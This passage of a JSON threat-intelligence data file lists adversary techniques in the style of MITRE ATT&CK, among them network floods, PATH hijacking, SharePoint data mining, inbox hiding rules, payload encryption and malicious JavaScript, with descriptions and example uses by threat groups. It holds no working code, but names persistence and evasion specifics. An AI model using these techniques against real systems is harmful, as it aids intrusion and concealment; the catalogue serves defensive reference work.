2017)",
    "similar_words": [
      "Disk Structure Wipe"
    ],
    "id": "T1561.002"
  },
  "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3": {
    "name": "Direct Network Flood",
    "example_uses": [],
    "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.Botnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
    "similar_words": [
      "Direct Network Flood"
    ],
    "id": "T1498.001"
  },
  "attack-pattern--0c2d00da-7742-49e7-9928-4514e5075d32": {
    "name": "Path Interception by PATH Environment Variable",
    "example_uses": [
      "contains a collection of Privesc-PowerUp modules that can discover and exploit path interception opportunities in the PATH environment variable.",
      "contains modules that can discover and exploit path interception opportunities in the PATH environment variable.",
      "overrides the %windir% environment variable by setting a Registry key HKEY_CURRENT_User\\Environment\\windir to an alternate command to execute a malicious AutoIt script. This allows  to run every time the scheduled task DiskCleanup is executed as this uses the path value %windir%\\system32\\cleanmgr.exe for execution."
    ],
    "description": "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line. Adversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.For example, on Windows if an adversary places a malicious program named \"net.exe\" in `C:\\example path`, which by default precedes `C:\\Windows\\system32\\net.exe` in the PATH environment variable, when \"net\" is executed from the command-line the `C:\\example path` will be called instead of the system's legitimate executable at `C:\\Windows\\system32\\net.exe`. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: ExpressVPN PATH env Windows 2021)Adversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the `$PATH` variable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl, [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or modifying the `/etc/paths.d` folder contents.(Citation: uptycs Fake POC linux malware 2023)(Citation: nixCraft macOS PATH variables)(Citation: Elastic Rules macOS launchctl 2022)",
    "similar_words": [
      "Path Interception by PATH Environment Variable"
    ],
    "id": "T1574.007"
  },
  "attack-pattern--0c4b4fda-9062-47da-98b9-ceae2dcf052a": {
    "name": "Sharepoint",
    "example_uses": [
      "has accessed and downloaded information stored in SharePoint instances as part of data gathering and exfiltration activity.",
      "has searched a victim's network for collaboration platforms like SharePoint to discover further high-privilege account credentials.",
      "is used to enumerate and dump information from Microsoft SharePoint.",
      "has collected documents from the victim's SharePoint.",
      "has collected information from Microsoft SharePoint services within target networks.",
      "During   accessed victim SharePoint environments to search for VPN and MFA enrollment information help desk instructions and new hire guides.",
      "used a SharePoint enumeration and data dumping tool known as spwebmember.",
      "has abused compromised credentials to exfiltrate data from SharePoint."
    ],
    "description": "Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:* Policies, procedures, and standards* Physical / logical network diagrams* System architecture diagrams* Technical system documentation* Testing / development credentials (i.e., [Unsecured Credentials](https://attack.mitre.org/techniques/T1552))* Work / project schedules* Source code snippets* Links to network shares and other internal resources",
    "similar_words": [
      "Sharepoint"
    ],
    "id": "T1213.002"
  },
  "attack-pattern--0cc222f5-c3ff-48e6-9f52-3314baf9d37e": {
    "name": "Artificial Intelligence",
    "example_uses": [],
    "description": "Adversaries may obtain access to generative artificial intelligence tools, such as large language models (LLMs), to aid various techniques during targeting. These tools may be used to inform, bolster, and enable a variety of malicious tasks, including conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043), creating basic scripts, assisting social engineering, and even developing payloads.(Citation: MSFT-AI) For example, by utilizing a publicly available LLM an adversary is essentially outsourcing or automating certain tasks to the tool. Using AI, the adversary may draft and generate content in a variety of written languages to be used in [Phishing](https://attack.mitre.org/techniques/T1566)/[Phishing for Information](https://attack.mitre.org/techniques/T1598) campaigns. The same publicly available tool may further enable vulnerability or other offensive research supporting [Develop Capabilities](https://attack.mitre.org/techniques/T1587). AI tools may also automate technical tasks by generating, refining, or otherwise enhancing (e.g., [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027)) malicious scripts and payloads.(Citation: OpenAI-CTI) Finally, AI-generated text, images, audio, and video may be used for fraud, [Impersonation](https://attack.mitre.org/techniques/T1656), and other malicious activities.(Citation: Google-Vishing24)(Citation: IC3-AI24)(Citation: WSJ-Vishing-AI24)",
    "similar_words": [
      "Artificial Intelligence"
    ],
    "id": "T1588.007"
  },
  "attack-pattern--0cf55441-b176-4332-89e7-2c4c7799d0ff": {
    "name": "Email Hiding Rules",
    "example_uses": [
      "creates inbound rules on the compromised email accounts of security personnel to automatically delete emails from vendor security products.",
      "has created rules in victims' Microsoft Outlook accounts to automatically delete emails containing words such as hacked phish and malware in a likely attempt to prevent organizations from communicating about their activities."
    ],
    "description": "Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the New-InboxRule or Set-InboxRule [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation: Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule)Adversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) emails sent from the compromised account.Any user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as malware, suspicious, phish, and hack) found in message bodies and subject lines. (Citation: Microsoft Cloud App Security)In some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).",
    "similar_words": [
      "Email Hiding Rules"
    ],
    "id": "T1564.008"
  },
  "attack-pattern--0cfe31a7-81fc-472c-bc45-e2808d1066a3": {
    "name": "External Defacement",
    "example_uses": [
      "defaced approximately 15000 websites belonging to Georgian government non-government and private sector organizations in 2019.",
      "is linked to the defacement of several Ukrainian organization websites."
    ],
    "description": "An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. [External Defacement](https://attack.mitre.org/techniques/T1491/002) may ultimately cause users to distrust the systems and to question/discredit the systems integrity. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.(Citation: FireEye Cyber Threats to Media Industries)(Citation: Kevin Mandia Statement to US Senate Committee on Intelligence)(Citation: Anonymous Hackers Deface Russian Govt Site) [External Defacement](https://attack.mitre.org/techniques/T1491/002) may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).(Citation: Trend Micro Deep Dive Into Defacement)",
    "similar_words": [
      "External Defacement"
    ],
    "id": "T1491.002"
  },
  "attack-pattern--0d91b3c0-5e50-47c3-949a-2a796f04d144": {
    "name": "Encrypted/Encoded File",
    "example_uses": [
      "has encrypted its payload.",
      "has been Base64 encoded and AES encrypted.",
      "encrypts its strings in RSA256 and encodes them in a custom base64 scheme and XOR.",
      "has encrypted malware payloads dropped on victim machines with AES and RC4 encryption.",
      "Most strings in  are encrypted using 3DES and XOR and reversed.",
      "Variants of  encrypt payloads using various XOR ciphers as well as a custom algorithm that uses the srand and rand functions.",
      "configuration is hardcoded and RC4 encrypted within the binary.",
      "encrypted its payload using a simple XOR algorithm with a single-byte key.",
      "has encrypted strings with a single byte XOR algorithm.",
      "has obfuscated strings in  by base64 encoding and then encrypting them.",
      "has encrypted documents and malicious executables.",
      "can use encrypted and encoded files for C2 configuration.",
      "has used an XOR-based algorithm to encrypt Tor clients dropped to disk. droppers have also been delivered as password-protected zip files that execute base64 encoded  commands.",
      "has obfuscated code using RC4 XOR and RSA.",
      "has dropped encoded executables on compromised hosts.",
      "The  payload is XOR encrypted and compressed.  has also XORed its configuration data with a constant value of `0xAA` and compressed it with the LZSS algorithm.",
      "encrypted a .dll payload using RTL and a custom encryption algorithm.  has also obfuscated payloads with base64 XOR and RC4.",
      "has encrypted the payload with an XOR-based algorithm.",
      "has encrypted it's main payload using 3DES.",
      "has used an XOR-based algorithm to encrypt payloads twice with different keys.",
      "obfuscates strings in the payload.",
      "can use a hardcoded one-byte XOR encoded configuration file.",
      "uses single-byte XOR obfuscation to obfuscate many of its files.",
      "has been encoded with Base64.",
      "The  config file is encrypted with RC4.",
      "has been seen using AES or DES to encrypt payloads and payload components.",
      "Some resources in  are encrypted with a simple XOR operation or encoded with Base64.",
      "encodes files in Base64.",
      "has been delivered as compressed RAR payloads in ZIP files to victims.",
      "module file has been encrypted via XOR.",
      "has obfuscated code using base64 and gzip compression.",
      "has used XOR RSA2 and RC4 encrypted files.",
      "has encrypted DMG files.",
      "has used base64 encoding and ECDH-P256 encryption for payloads.",
      "has a XOR-encoded payload.",
      "modules are stored encrypted on disk.",
      "has used Base64 encoded strings and scripts.",
      "has delivered compressed executables within ZIP files to victims.",
      "configuration is encrypted.",
      "has used malware to drop encrypted CAB files.",
      "supports file encryption (AES with the key lolomycin2017).",
      "has encrypted payloads and strings.",
      "has used multiple types of encryption and encoding for their payloads including AES Caracachs RC4 XOR Base64 and other tricks such as creating aliases in code for  function names.",
      "has used base64 to encode payloads.",
      "During  threat actors used a DLL that included an XOR-encoded section.",
      "encrypts its configuration files with AES-256.",
      "can Base64 encode its payload.",
      "encrypts strings in the backdoor using a custom XOR algorithm.",
      "Some data in  is encrypted using RC5 in CBC mode AES-CBC with a hardcoded key RC4 or Salsa20. Some data is also base64-encoded.",
      "The  JavaScript payload has been delivered within a compressed ZIP archive.  has also single or double Base-64 encoded references to its second-stage server URLs.",
      "During  the threat actors used Base64 to encode files with a custom key.",
      "can be delivered as a compressed encrypted and encoded payload.",
      "The  payload has been delivered encrypted with a custom XOR-based algorithm and also as a base64-encoded ZIP file.",
      "can encode files containing information about the targeted system.",
      "has obfuscated code using Base64 encoding.",
      "is heavily obfuscated and includes encrypted configuration files.",
      "has used XOR with 0x90 to obfuscate its configuration file.",
      "has used a RAR SFX dropper to deliver malware.",
      "can Base64 encode strings store downloaded files in reverse byte order and use the Eazfuscator tool to obfuscate its third stage.",
      "has been encoded to avoid detection from static analysis tools.",
      "has been encrypted with XOR using different 32-long Base16 strings and compressed with LZW algorithm.",
      "drops an encrypted PE file pe.bin and decrypts it during installation.  also uses custom base64 encoding schemas in later variations to obfuscate payloads.",
      "encrypts some of its files with XOR.",
      "has encoded its payloads using a ChaCha stream cipher with a 256-bit key and 64-bit Initialization vector (IV) to evade detection.",
      "has been encrypted using XOR and RC4.",
      "has password-protected malicious Word documents.",
      "uses encrypted configuration blocks and writes encrypted files to disk.",
      "used Base64 encoded compressed payloads.",
      "has used RC4-encrypted strings and string hashes to avoid identifiable strings within the binary.",
      "downloads additional files that are base64-encoded and encrypted with another cipher.",
      "obfuscates its configuration data with XOR.",
      "APIs and strings in some  variants are RC4 encrypted. Another variant is encoded with XOR.",
      "has been XOR-encoded.",
      "used Base64 to obfuscate payloads.",
      "has used encrypted strings in its dropper component.",
      "has base64 encoded payloads to avoid detection.",
      "DLL file and non-malicious decoy file are encrypted with RC4 and some function name strings are obfuscated.",
      "A  tool can encrypt payloads using XOR.  malware is also obfuscated using Metasploits shikata_ga_nai encoder as well as compressed with LZNT1 compression.",
      "A  configuration file is encrypted with a simple XOR key 0x53.",
      "encrypts its C2 configuration files with AES in CBC mode.",
      "payload has been encrypted with a key that has the hostname and processor family information appended to the end.",
      "encrypts several of its files including configuration files.",
      "has the ability to XOR encrypt files to be sent to C2.",
      "can Base64 encode payloads.",
      "Configuration data used by  has been encrypted using an RC4 stream algorithm.",
      "uses a custom algorithm to obfuscate its internal strings and uses hardcoded keys. also uses encoded configuration files and has encoded payloads using Base64.",
      "can encrypt its configuration file with AES CBC.",
      "has included a base64 encoded executable.",
      "has used compressed and char-encoded scripts in operations.",
      "is distributed as a set of encrypted files and scripts.",
      "In one version of  string obfuscation routines were used to hide many of the critical values referenced in the malware.",
      "has downloaded as a XOR-encrypted payload.",
      "can encrypt strings at compile time.",
      "has used RC4 encrypted shellcode and encrypted functions.",
      "has used scripts encoded in Base64 certificates to distribute malware to victims.",
      "can encode its configuration file with single-byte XOR encoding.",
      "malware has used base64-encoded files and has also encrypted embedded strings with AES.",
      "obfuscates configuration data.",
      "has obfuscated its module with an alphabet-based table or XOR encryption.",
      "has utilzed encrypted binaries and base64 encoded strings.",
      "has obfuscated the wallet address in the payload binary.",
      "has encrypted configuration files.",
      "can encrypt and encode its configuration file.",
      "can encrypt sections of its code to evade detection.",
      "Strings in 's components are encrypted with a XOR cipher using a hardcoded key and the configuration data log files and plugins are encrypted using a hybrid encryption scheme of Blowfish-OFB combined with RSA.",
      "has used encrypted strings and configuration files.",
      "has compressed the  executable within malicious email attachments.  has also encrypted payloads before they are downloaded to victims.",
      "Some strings in  are obfuscated with XOR x56.",
      "uses a simple one-byte XOR method to obfuscate values in the malware.",
      "has used an encrypted configuration file for its loader.",
      "s installer is obfuscated with a custom crypter to obfuscate the installer.",
      "The payload of  is encrypted with simple XOR with a rotating key. The  configuration file has been encrypted with RC4 keys.",
      "encrypts its configuration file using a simple algorithm.",
      "has been compressed and obfuscated using RC4 AES or XOR.",
      "can be compressed with the ApLib algorithm.",
      "has encrypted the payload used for C2.",
      "has encoded strings in its malware with base64 as well as with a simple single-byte XOR obfuscation using key 0x40.",
      "has encrypted payloads using RC4 and XOR.",
      "has been compiled and encrypted with PyInstaller specifically using the --key flag during the build phase.",
      "is obfuscated using the obfuscation tool called ConfuserEx.",
      "can compress 32-bit and 64-bit driver files with the Lempel-Ziv algorithm.",
      "obfuscates the configuration with a custom Base64 and XOR.",
      "During  the threat actors encoded some payloads with a single-byte XOR both skipping the key itself and zeroing in an attempt to avoid exposing the key; other payloads were Base64-encoded.",
      "has Base64-encoded its configuration file.",
      "has used obfuscated web shells in their operations.",
      "has encrypted its binaries via AES and encoded files using Base64.",
      "Many strings in  are obfuscated with a XOR algorithm.",
      "has written AES-encrypted and Base64-encoded configuration files to disk.",
      "has encrypted its configuration file.",
      "is encrypted using single-byte XOR.",
      "can compress and obfuscate its strings to evade detection on a compromised host.",
      "can encrypt its payload.",
      "has encrypted their payloads.",
      "The  payload is encrypted with AES-128.",
      "encrypts strings with XOR.  also encrypts all configuration and settings in AES and RC4.",
      "has been obfuscated with a XOR-based algorithm.",
      "can be delivered encrypted to a compromised host.",
      "has been obfuscated with hex-encoded strings.",
      "has encrypted strings with single-byte XOR and base64 encoded RC4.",
      "disguised its malicious binaries with several layers of obfuscation including encrypting the files.",
      "During   encrypted malware such as  with XOR and DLL files with base64.",
      "has used encrypted strings in its installer.",
      "contained Base64-encoded strings.",
      "has used XOR-based encryption to mask C2 server locations within the trojan.",
      "Droppers used by  use RC4 or a 16-byte XOR key consisting of the bytes 0xA0  0xAF to obfuscate payloads.",
      "encodes its second-stage payload with Base64.",
      "has encrypted and encoded data in its malware including by using base64.",
      "has been obfuscated and contains encrypted functions.",
      "uses various XOR techniques to obfuscate its components.",
      "encrypts its configuration and payload.",
      "uninstaller has base64-encoded its variables.",
      "can use encrypted string blocks for obfuscation.",
      "The  payload includes encrypted strings stored within the .bss section of the binary file.",
      "For  the threat actors used XOR-encrypted payloads.",
      "has the ability to encrypt and compress its payload.",
      "uses RC4 for encrypting the configuration.",
      "has performed code obfuscation including encoding payloads using Base64 and using a framework called Dont-Kill-My-Cat (DKMC).  also encrypts the library used for network exfiltration with AES-256 in CBC mode in their macOS backdoor.",
      "has the ability to encrypt PE files with a reverse XOR loop.",
      "logs its actions into files that are encrypted with 3DES. It also uses RSA to encrypt resources.",
      "During  threat actors used a Base64-encoded Python script to write a patched version of the Ivanti Connect Secure `dsls` binary.",
      "has encrypted an ELF file.",
      "has the ability to compress its components.",
      "A  variant is encoded using a simple XOR cipher.",
      "can obfuscate variable names encrypt strings as well as base64 encode and Rijndael encrypt payloads.",
      "uses an AES CBC (256 bits) encryption algorithm for its loader and configuration files.",
      "has the ability to RC4 encrypt and base64 encode decrypted files on compromised servers prior to writing them to stdout.",
      "can use AES and CAST-128 encryption to obfuscate resources.",
      "can Base64 encode its C2 address stored in a template binary with the `xyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw_-` or`xyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw_=` character sets.",
      "encrypts the configuration.",
      "has encrypted strings in the binary for obfuscation.",
      "encrypts its configuration files with AES-256 and also encrypts its strings.",
      "has the ability to download a base64 encoded payload.",
      "has encrypted its payload with RC4.",
      "encodes many of its artifacts and is encrypted (AES-128) when downloaded.",
      "strings are XOR-encrypted.",
      "The  binary contains RC4 encrypted embedded scripts.",
      "initial payloads included encoded follow-on payloads located in the resources file of the first-stage loader.",
      "begins with an initial launcher that decrypts an AES-128-CFB encrypted file on disk and executes it in memory.",
      "encrypted captured credentials with AES then Base64 encoded them before writing to local storage.",
      "uses RC4 encryption for strings and command and control addresses to evade static detection.",
      "has used RC4 and AES to encrypt strings and its exfiltration configuration respectively.",
      "contains an embedded XML configuration file with an encrypted list of command and control servers. These are written to an external configuration file during execution.",
      "decrypts an embedded payload.",
      "contains an embedded AES-encrypted resource named METADATA that contains configuration information for follow-on execution.",
      "The  install files have been encrypted with AES-256.",
      "used encrypted payloads decrypted and executed in memory.",
      "uses obfuscated URLs to download a ZIP file.",
      "has used a pseudo random number generator (PRNG) algorithm and a rolling XOR key to obfuscate strings.",
      "has used encrypted payloads within files for follow-on execution and defense evasion.",
      "During  threat actors used Base64-encrypted Python code to evade detection.",
      "has an encrypted configuration file.",
      "The  payload is XOR encrypted and compressed.  has also XORed its configuration data with a constant value of `0xAA`.",
      "has obfuscated code using base64.",
      "The  payload includes an encrypted main component.",
      "features encrypted functions using the RC4 algorithm and bytecode operations.",
      "can be passed a reference to an XOR-encrypted configuration file at runtime.",
      "uses XOR-encoded strings to obfuscate items.",
      "can generate encrypted compressed/encoded or otherwise obfuscated code modules.",
      "has single or double Base-64 encoded references to its second-stage server URLs.",
      "has been encrypted with XOR using different 32-long Base16 strings.",
      "contains a series of base64 encoded substrings.",
      "encrypts the C2 configuration file using AES with a static key while the module `.dylib` files use a rolling one-byte encoding for obfuscation.",
      "stores base64 encoded command and contorl URLs in a configuraiton file with each URL prefixed with the value `LR02DPt22R`.",
      "A  tool can encrypt payloads using XOR.  malware is also obfuscated using Metasploits shikata_ga_nai encoder.",
      "stores primary content as base64-encoded objects.",
      "can encrypt encode and compress multiple layers of shellcode.",
      "stores obfuscated DLL file names in its executable.",
      "XOR encodes a  installation payload in a DLL file that is decoded with a hardcoded key when called by a legitimate 7zip installation process.",
      "has encrypted payloads before they are downloaded to victims.",
      "is distributed as an encrypted payload.",
      "stored installation payloads as encrypted files in hidden folders during .",
      "During   deployed VBS droppers with obfuscated strings.",
      "has used AES-encrypted payloads contained within PowerShell scripts.",
      "Older  variants use `xxd` to encode modules. Later versions pass an `xxd` or `base64` encoded blob through multiple decoding stages to reconstruct the module name AppleScript or shell command. For example the initial network request uses three layers of hex decoding before executing a curl command in a shell.",
      "utilizes AES-256 (CBC mode) XOR and RSA-2048 encryption schemas for various configuration and other objects."
    ],
    "description": "Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as [Software Packing](https://attack.mitre.org/techniques/T1027/002), [Steganography](https://attack.mitre.org/techniques/T1027/003), and [Embedded Payloads](https://attack.mitre.org/techniques/T1027/009), share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)) at the time of execution/use.This type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files.(Citation: File obfuscation) Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding schemes such as Base64.The entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.For example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a [Phishing](https://attack.mitre.org/techniques/T1566) payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: SFX - Encrypted/Encoded File) Adversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) execution.",
    "similar_words": [
      "Encrypted/Encoded File"
    ],
    "id": "T1027.013"
  },
  "attack-pattern--0dda99f0-4701-48ca-9774-8504922e92d3": {
    "name": "IP Addresses",
    "example_uses": [
      "has limited its watering hole attacks to specific IP address ranges.",
      "has captured the IP addresses of visitors to their phishing sites.",
      "has obtained IP addresses for publicly-accessible Exchange servers."
    ],
    "description": "Adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted.Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
    "similar_words": [
      "IP Addresses"
    ],
    "id": "T1590.005"
  },
  "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7": {
    "name": "OS Exhaustion Flood",
    "example_uses": [],
    "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
    "similar_words": [
      "OS Exhaustion Flood"
    ],
    "id": "T1499.001"
  },
  "attack-pattern--0f2c410d-d740-4ed9-abb1-b8f4a7faf6c3": {
    "name": "PowerShell Profile",
    "example_uses": [
      "has used PowerShell profiles to maintain persistence on an infected machine."
    ],
    "description": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (profile.ps1) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001) starts and can be used as a logon script to customize user environments.[PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several profiles depending on the user or host program. For example, there can be different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001) host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001) drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001) session the modified script will be executed unless the -NoProfile flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)",
    "similar_words": [
      "PowerShell Profile"
    ],
    "id": "T1546.013"
  },
  "attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d": {
    "name": "JavaScript",
    "example_uses": [
      "has the ability to use JavaScript to execute PowerShell.",
      "The  System Profiler can use JavaScript to perform reconnaissance actions.",
      "includes payloads written in JavaScript.",
      "has used various JavaScript-based backdoors.",
      "has used JavaScript for drive-by downloads and C2 communications.",
      "executes additional Jscript code on the victim's machine.",
      "has used malicious JavaScript to steal payment card data from e-commerce sites.",
      "has used JavaScript to drop and execute malware loaders.",
      "The  web inject module can inject Java Script into web banking pages visited by the victim.",
      "has used JavaScript to deliver malware hosted on HTML pages.",
      "has been executed through a malicious JScript downloader.",
      "has used JavaScript files to execute its  payload.",
      "has manipulated legitimate websites to inject malicious JavaScript code as part of their watering hole operations.",
      "is written in and executed as .",
      "has used JS scripts.",
      "has used JavaScript in its attacks.",
      "The  payload is executed as JavaScript.",
      "can write files to disk with JavaScript using a modified version of the open-source tool FileSaver.",
      "can execute JavaScript containing configuration data for establishing persistence.",
      "has used JavaScript for code execution.",
      "can use a JavaScript file as part of its execution chain.",
      "uses JavaScript to perform its core functionalities.",
      "used JavaScript scripts to help perform tasks on the victim's machine.",
      "can download and execute JavaScript files.",
      "During   deployed JScript web shells on compromised systems.",
      "is a credential harvester written in JavaScript.",
      "can generate shellcode outputs that execute via JavaScript or JScript.",
      "can execute malicious JavaScript payloads on the victims machine.",
      "has executed JavaScript scriptlets on the victim's machine.",
      "used JavaScript to execute additional files.",
      "has used JScript for logging and downloading additional tools.",
      "has used JavaScript to execute malicious code on a victim's machine.",
      "has been distributed as HTA files with JScript.",
      "has the ability to execute arbitrary JavaScript code on a compromised host.",
      "has used malicious JavaScript files for several components of their attack.",
      "can use JavaScript code for execution.",
      "used various implants including those built with JS on target machines.",
      "has used JavaScript and Node.Js information stealer script that exfiltrates data using the node process.",
      "infected victims using JavaScript code.",
      "During  the threat actors used JavaScript code.",
      "can execute JavaScript by injecting it into the victim's browser.",
      "has used malicious JavaScript files on the victim's machine.",
      "has executed malicious JavaScript code.",
      "During  the threat actors used a malicious HTA file that contained a mix of encoded HTML and JavaScript/VBScript code.",
      "had used Javascript to perform its core functions.",
      "uses JavaScript to perform its core functionalities.",
      "can support the use of a JSON configuration file.",
      "has delivered malicious Microsoft Office files containing an embedded JavaScript object that would on execution download and execute  and .",
      "has used JavaScript to execute additional malicious payloads.",
      "delivered malicious JavaScript to exploit targets when exploiting Roundcube Webmail servers.",
      "has used JavaScript files as part its infection chain during malicious spam  email campaigns.",
      "can execute a Javascript file for initial infection.",
      "initial delivery included obfuscated JavaScript objects stored in password-protected ZIP archives.",
      "utilized obfuscated JavaScript files for initial  payload download.",
      "has used JavaScript files in malware execution chains.",
      "has used JavaScript to redirect victim traffic from an adversary controlled server to a server hosting the Evilginx phishing framework.",
      "is distributed as a JavaScript launcher file.",
      "has been distributed as a malicious JavaScript object.",
      "has used JScript for logging and downloading additional tools.  has used  which contained four Javascript files for bypassing defenses collecting sensitive information and screenshots and exfiltrating data."
    ],
